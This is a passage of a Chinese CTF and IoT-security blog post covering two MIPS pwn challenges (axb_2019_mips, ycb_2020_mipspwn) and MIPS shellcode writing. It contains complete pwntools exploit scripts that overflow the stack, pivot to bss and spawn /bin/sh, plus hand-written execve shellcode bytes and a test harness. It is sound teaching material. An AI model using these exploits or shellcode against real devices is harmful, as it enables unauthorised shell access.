class="line">p.send(payload)</span><br><span class="line">p.interactive()            </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>不过这里在打远程的时候，明显发现泄露出来的并不是一个栈地址（因为本地和远程的环境不同，如下图），所以这个方法打远程是行不通的</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120725360.png" alt="image-20230512072536085"></p>
+<p>如果不泄露栈地址的话，我们考虑可以栈迁移到 <code>bss</code> 段上，并且往 <code>bss</code> 段写入 <code>shellcode</code></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122036129.png" alt="image-20230512203620008"></p>
+<p>通过分析上面的汇编发现， <code>read</code> 的第二个参数 <code>$a1</code> 由 <code>fp</code> 控制，而通过阅读 <code>read</code> 函数后的汇编代码，存在一句 <code>lw    $fp, 0x38($sp)</code> ，又因为此处有栈溢出，相当于我们有一次任意地址写的机会。我们选择往 <code>bss</code> 段写入 <code>shellcode</code> ，然后寻找迁移的机会，迁移到 <code>bss</code> 段的 <code>shellcode</code> 执行。</p>
+<p>执行完程序原本的 <code>read</code> 函数后，有一句 <code>lw   $ra,0x3c($sp)</code> 的汇编，我们将距离栈顶 <code>0x3c</code> 的位置放成上面提到的 <code>lw   $fp,0x38($sp)</code> 指令地址，以此跳转过去</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122116335.png" alt="image-20230512211611122"></p>
+<p>下图为向 <code>bss</code> 段写入数据的 <code>read</code> 函数</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122119885.png" alt="image-20230512211952663" style="zoom:50%;" />
+
+
+
+<p>当 <code>read</code> 往 <code>bss</code> 段读入完数据后，执行了 <code>mov   $sp,$fp</code> ，此时栈进行了迁移（<code>fp</code> 是最初控制的那个 <code>bss</code> 段地址）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122118517.png" alt="image-20230512211852230"></p>
+<p>随后下一条指令 <code>lw   $ra,0x3c($sp)</code> 将 <code>$ra</code> 的值再次进行了设置，因为 <code>$sp</code> 是可控的 <code>bss</code> 段地址，所以 <code>$ra</code> 依然可控，我们将 <code>$ra</code> 设置为 <code>shellcode</code> 的起始地址（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122127368.png" alt="image-20230512212720766"></p>
+<p>但戏剧的是，这种打法导致了远程通了，本地没通。因为本题环境的原因，<code>bss</code> 段是没有可执行权限的，而远程的 <code>bss</code> 段是有可执行权限的。</p>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;mips&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, word_size=32,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25115</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x410ba0</span></span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x20</span>+p32(bss_addr)+p32(<span class="number">0x4007E4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x24</span>+p32(<span class="number">0x410be0</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122131912.png" alt="image-20230512213146674"></p>
+<h4 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h4><h5 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142040351.png" alt="image-20230514204013277"></p>
+<h5 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h5><p>本题与上一道的漏洞一样，同样是栈溢出。</p>
+<p>采用的策略是打 <code>ret2shellcode</code></p>
+<p>只不过本题的 <code>shellcode</code> 是手写的 <a href="#shellcode%E7%BC%96%E5%86%99">如何编写MIPS架构下的 shellcode</a> </p>
+<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29366</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Warrior,leave your name here:\n&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x4115F0</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Write down your feeling:\n&quot;</span>,<span class="number">0x38</span>*<span class="string">b&#x27;b&#x27;</span>+p32(bss_addr)+p32(<span class="number">0x400F54</span>))</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh&quot;</span></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3c</span>+p32(<span class="number">0x411648</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142045142.png" alt="image-20230514204550938"></p>
+<h3 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h3><h4 id="write-系统调用"><a href="#write-系统调用" class="headerlink" title="write 系统调用"></a><code>write</code> 系统调用</h4><p>我们先去尝试编写一段能够输出 <code>ABC\n</code> 字符串的 <code>shellcode</code></p>
+<p>创建 <code>write.s</code> 文件，将下面的汇编代码写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">lui $t6,0x4142</span><br><span class="line">ori $t6,$t6,0x430a</span><br><span class="line">sw $t6,0($sp)</span><br><span class="line">li $a0,1</span><br><span class="line">addiu $a1,$sp,0</span><br><span class="line">li $a2,5</span><br><span class="line">li $v0,4004</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p> <code>.section .text</code> 指定了该段代码所在的节</p>
+<p> <code>.globl __start</code> 表示将 <code>__start</code> 导出为全局符号（ <code>Global Symbol</code> ）。在C语言编写的程序中，程序的入口点通常被命名为 <code>_start</code>，而在汇编代码中通常使用 <code>__start</code></p>
+<p> <code>.set noreorder</code> 禁止指令重排，确保汇编代码的执行顺序与源代码中指定的顺序一致。指令重排是编译器和处理器在优化代码执行速度时采用的一种技术，它可以改变指令的执行顺序，以便在不影响程序逻辑的情况下提高代码执行效率。</p>
+<p><code>__start:</code> 是程序的入口点符号，在程序执行时将从这里开始执行指令。</p>
+<p><code>addiu $sp,$sp,-32</code> 将开辟一个 <code>0x20</code> 大小的栈帧</p>
+<p><code>lui $t6,0x4142</code> 是将 <code>0x4142</code> 左移 <code>16</code> 位后（也就是 <code>0x41420000</code> ）放入 <code>$t6</code> 寄存器。</p>
+<p><code>ori $t6,$t6,0x430a</code> 将 <code>$t6</code> 与立即数 <code>0x430a</code> 进行或运算，所以 <code>$t6</code> 寄存器里会放 <code>0x4142430a</code> 这也就是 <code>ABC\n</code> 的 <code>ASCII</code> 码。</p>
+<p>在看到这两条汇编语句的时候，我不禁疑惑起来，为什么不直接使用 <code>li $t6,0x4142430a</code> 指令呢，测试了一下编译链接之后的可执行文件依然是将这句指令转换成了 <code>lui $t6,0x4142   ori $t6,$t6,0x430a</code> ，最终查阅了资料发现在 <code>MIPS</code> 架构中立即数通常是 <code>16</code> 位的有符号整数（范围 <code>-32768 ~ 32767</code> ），如果需要使用一个超出这个范围的立即数，汇编器会自动将其拆分为两个 <code>16</code> 位的立即数，并使用 <code>lui</code> 和 <code>ori</code> 指令将其装载到寄存器中</p>
+<p><code>sw $t6,0($sp)</code> 将 <code>ABC\n</code>这四个字符写入栈中</p>
+<p><code>li $a0,1</code> 设置 <code>write</code> 系统调用的第一个参数，即标准输出流</p>
+<p><code>addiu $a1,$sp,0</code> 将 <code>ABC\n</code> 的地址设置为 <code>write</code> 系统调用的第二个参数</p>
+<p><code>li $a2,5</code> 设置 <code>write</code> 系统调用的第三个参数，即字符串长度为 <code>5</code> ，<code>ABC\n</code> 别忘记字符串末尾是还有一个 <code>\x00</code> 字符的</p>
+<p><code>li $v0,4004</code> 设置 <code>$v0</code> 寄存器为 <code>write</code> 的系统调用号  <a target="_blank" rel="noopener" href="https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h">查看 <code>MIPS</code> 架构的系统调用号</a></p>
+<p><code>syscall</code> 触发系统调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-as write.s -o write.o</span><br><span class="line">mips-linux-gnu-ld write.o -o write</span><br></pre></td></tr></table></figure>
+
+<p>上面两条命令首先使用汇编器 <code>mips-linux-gnu-as</code> 将 <code>write.s</code> 中的汇编代码转换为机器码（生成文件 <code>write.o</code> ），再用链接器 <code>mips-linux-gnu-ld</code> 将刚生成的 <code>write.o</code> 链接为 <code>write</code> 可执行文件。</p>
+<p>为了简化汇编和链接的过程，我们来编写一个 <code>shell</code> 脚本，起名为 <code>nasm.sh</code>（如下）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src=$1</span><br><span class="line">dst=$2</span><br><span class="line">mips-linux-gnu-as $1 -o s.o</span><br><span class="line">echo &quot;as ok&quot;</span><br><span class="line">mips-linux-gnu-ld s.o -o $dst</span><br><span class="line">echo &quot;ld ok&quot;</span><br><span class="line">rm s.o</span><br></pre></td></tr></table></figure>
+
+<p>这样将编写的 <code>shellcode</code> 文件，变成可执行文件只需要使用 <code>./nasm.sh write.s write</code> 命令即可（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305131404932.png" alt="image-20230513140452675"></p>
+<p>可以看到 <code>ABC\n</code> 字符串已经被成功输出，程序崩溃的原因是因为 <code>shellcode</code> 没有正常的退出，导致执行了不正确指令让程序崩溃。 想调试 <code>shellcode</code> 的话，方式和调试 <code>MIPS</code> 架构的程序是一模一样的。</p>
+<h4 id="execve-系统调用"><a href="#execve-系统调用" class="headerlink" title="execve 系统调用"></a><code>execve</code> 系统调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">li $a2,0x111</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">li $a2,0 </span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,20</span><br><span class="line">li $a1,0</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure>
+
+<p>前四行的解释上面已经提过了，就不再赘述。</p>
+<p><code>li $a2,0x111</code> <code>p:bltzal $a2,p</code>   <code>li $a2,0</code> 这三条指令的目的就是为了把 <code>addiu $sp,$sp,-32</code> 这条指令的地址放入 <code>$ra</code> 寄存器中。</p>
+<p><code>addiu $sp,$sp,-32</code> 是为了开辟一个新的栈帧，大小为 <code>0x20</code></p>
+<p><code>addiu $a0,$ra,20</code> 这个指令中的 <code>20</code> 很讲究，这就要牵扯到 <code>sc:</code> 以及后面的东西了<code>0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</code> 就是字符串 <code>/bin/sh</code> 。而这个字符串也是存放到了 <code>text</code> 段，就位于 <code>syscall</code> 后面的地址。因为 <code>MIPS</code> 架构中一个指令是固定的 <code>4</code> 字节，上面提到的 <code>$ra</code> 寄存器存储了 <code>addiu $sp,$sp,-32</code> 的地址，而这个指令距离 <code>/bin/sh</code> 中间还有 <code>5</code> 个指令，<code>4*5 = 20</code> 字节。因此这里的 <code>$a0</code> 拿到了 <code>/bin/sh</code> 字符串的地址。</p>
+<p>目的是执行 <code>execve(&quot;/bin/sh\x00&quot;,0,0)</code> ，所以我们将 <code>$a1</code> <code>$a2</code> 寄存器设置为 <code>0</code> ，使用 <code>li</code> 指令进行赋值即可，<code>execve</code> 系统调用号为 <code>4011</code>。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142032761.png" alt="image-20230514203232473"></p>
+<h4 id="shellcode的提取与测试"><a href="#shellcode的提取与测试" class="headerlink" title="shellcode的提取与测试"></a>shellcode的提取与测试</h4><p>将 <code>shellcode</code> 提取的话，我用的方法是将其放到 <code>IDA</code> 里面，然后 <code>shift+e</code> 提取（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142034440.png" alt="image-20230514203453331"></p>
+<p>然后用下面的 <code>python</code> 脚本，<code>x</code> 列表里面放的是刚刚提前的数据，最后输出的内容便是 <code>shellcode</code> 字节码</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = [  <span class="number">0x24</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0xD0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x24</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x27</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0C</span>]</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter the endian of the shell code&quot;</span>)</span><br><span class="line">choice=<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;little&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(x),<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">list</span>.extend(<span class="built_in">reversed</span>(x[i:i+<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;big&quot;</span>:</span><br><span class="line">  <span class="built_in">list</span> = x</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;\\x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>&#x27;</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">list</span>])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>最后就是测试提取出来的字节码能否正确执行，我们使用下面的 <code>C</code> 脚本（要<strong>注意编译完程序的字节序</strong>，如果程序是大端的，而 <code>shellcode</code> 是按照小端序写的，那么肯定是运行失败的）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc shellcode.c -o test -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;</span><br><span class="line"><span class="string">&quot;\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*s)(<span class="type">void</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sc size %d\n&quot;</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    s = shellcode;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142127071.png" alt="image-20230514212707011"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi">mips_arm汇编学习 - Note (gitbook.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">路由器漏洞分析环境搭建 | Prowes5’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yalecaltech/article/details/117326975">(47条消息) MIPS下shellcode编写_Elwood Ying的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">《IoT从入门到入土》(1)–MIPS交叉编译环境搭建及其32位指令集 (yuque.com)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zikh26.github.io">ZIKH26</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zikh26.github.io/posts/919c29c4.html">https://zikh26.github.io/posts/919c29c4.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zikh26.github.io" target="_blank">ZIKH26's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MIPS%E6%9E%B6%E6%9E%84/">MIPS架构</a></div><div class="post_share"><div class="social-share" data-image="/img/24.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/81a94eee.html"><img class="prev-cover" src="/img/feiji.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">预测urandom的输出</div></div></a></div><div class="next-post pull-right"><a href="/posts/d1f081a9.html"><img class="next-cover" src="/img/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">D-Link DIR-815路由器溢出漏洞分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/d1f081a9.html" title="D-Link DIR-815路由器溢出漏洞分析"><img class="cover" src="/img/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-23</div><div class="title">D-Link DIR-815路由器溢出漏洞分析</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZIKH26</div><div class="author-info__description">万古凡间一过客，九天之上第一仙</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">99</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZIKH26"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ZIKH26" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2777256035@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E4%B8%8E%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">启动与调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8"><span class="toc-number">2.1.</span> <span class="toc-text">启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">2.2.</span> <span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.2.1.</span> <span class="toc-text">直接调试程序</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9B%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">加载进程调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">汇编指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">4.</span> <span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">4.1.</span> <span class="toc-text">通用寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">4.2.</span> <span class="toc-text">特殊寄存器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIPS32-%E6%9E%B6%E6%9E%84%E7%9F%A5%E8%AF%86"><span class="toc-number">5.</span> <span class="toc-text">MIPS32 架构知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="toc-number">6.</span> <span class="toc-text">函数调用约定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0"><span class="toc-number">7.</span> <span class="toc-text">题目练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#axb-2019-mips"><span class="toc-number">7.1.</span> <span class="toc-text">axb_2019_mips</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="toc-number">7.1.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99"><span class="toc-number">7.1.2.</span> <span class="toc-text">解决报错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">7.1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">7.1.4.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP"><span class="toc-number">7.1.5.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ycb-2020-mipspwn"><span class="toc-number">7.2.</span> <span class="toc-text">ycb_2020_mipspwn</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5-1"><span class="toc-number">7.2.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="toc-number">7.2.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP-1"><span class="toc-number">7.2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode%E7%BC%96%E5%86%99"><span class="toc-number">8.</span> <span class="toc-text">shellcode编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#write-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">8.1.</span> <span class="toc-text">write 系统调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#execve-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">8.2.</span> <span class="toc-text">execve 系统调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95"><span class="toc-number">8.3.</span> <span class="toc-text">shellcode的提取与测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">9.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/d1f081a9.html" title="D-Link DIR-815路由器溢出漏洞分析"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="D-Link DIR-815路由器溢出漏洞分析"/></a><div class="content"><a class="title" href="/posts/d1f081a9.html" title="D-Link DIR-815路由器溢出漏洞分析">D-Link DIR-815路由器溢出漏洞分析</a><time datetime="2023-05-23T05:07:26.119Z" title="发表于 2023-05-23 13:07:26">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/919c29c4.html" title="IOT安全入门学习--MIPS汇编基础"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IOT安全入门学习--MIPS汇编基础"/></a><div class="content"><a class="title" href="/posts/919c29c4.html" title="IOT安全入门学习--MIPS汇编基础">IOT安全入门学习--MIPS汇编基础</a><time datetime="2023-05-15T07:51:54.338Z" title="发表于 2023-05-15 15:51:54">2023-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/81a94eee.html" title="预测urandom的输出"><img 